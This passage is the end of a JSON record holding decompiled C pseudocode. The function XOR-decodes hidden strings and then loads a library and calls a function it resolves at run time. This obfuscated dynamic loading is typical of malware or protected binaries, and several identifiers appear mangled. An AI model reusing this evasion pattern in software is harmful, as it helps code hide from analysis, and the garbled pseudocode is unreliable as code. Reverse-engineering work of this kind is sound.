}\n  *(_WORD *)&v20[8] = 30308;\n  *(_QWORD *)v20 = 0x76B6E1071DCF00F172;\n  *(__m128 *)&v20[2] = _mm_xor_ps(*(__m128 *)&v20[2], (__m128)xmmword_14EC6E3C0);\n  v21 = 0;\n  v22 = xmmword_14EC6E3D0;\n  v23 = 0;\n  LO19C4(v22) = 99;\n  for ( i = 1LL; i != 15; ++i )\n    *((_WORD *)&v22 + i) ^= (_WORD)i + 30304;\n  v23 = 0;\n  v24[0] = xmmword_14EC6E3E0;\n  v24[1] = xmmword_14EC6E3F0;\n  v24[2] = xmmword_14EC6E400;\n  v24[3] = xmmword_14EC6E410;\n  v24[4] = xmmword_14EC6E420;\n  v25 = 1973392541;\n  v26 = 30346;\n  v27 = 0;\n  LO19C4(v24[0]) = 47;\n  for ( j = 1LL; j != 85; ++j )\n    *((_WORD *)v24 + j) ^= (_WORD)j + 30304;\n  v27 = 0;\n  v4(a1, a2, v20, 0LL, &v22);\n  result = (__int64 (__fastcall *)(HM995CE, const CHAR *, __int64, __int64))sub_1445C2B64((CHAR *)a1, a2);\n  if ( (_DWORD)result )\n  {\n    LoadLibraryA((LPDA4D)a1);\n    result = (__int64 (__fastcall *)(HM995CE, const CHAR *, __int64, __int64))GetProcAddress(a1, a2);\n    if ( result )\n      return (__int64 (__fastcall *)(HM995CE, const CHAR *, __int64, __int64))result(a1, a2, v18, v19);\n  }\n  return result;\n}\n// 1445C2BFE: variable 'v3' is possibly undefined\n// 1445C2E1E: variable 'v18' is possibly undefined\n// 14EC6E3C0: using guessed type __int128 xmmword_14EC6E3C0;\n// 14EC6E3D0: using guessed type __int128 xmmword_14EC6E3D0;\n// 14EC6E3E0: using guessed type __int128 xmmword_14EC6E3E0;\n// 14EC6E3F0: using guessed type __int128 xmmword_14EC6E3F0;\n// 14EC6E400: using guessed type __int128 xmmword_14EC6E400;\n// 14EC6E410: using guessed type __int128 xmmword_14EC6E410;\n// 14EC6E420: using guessed type __int128 xmmword_14EC6E420;\n// 148C251F8: using guessed type __int64 qword_148C251F8;\n// 148C25208: using guessed type __int64 qword_148C25208;\n\n"
    }
]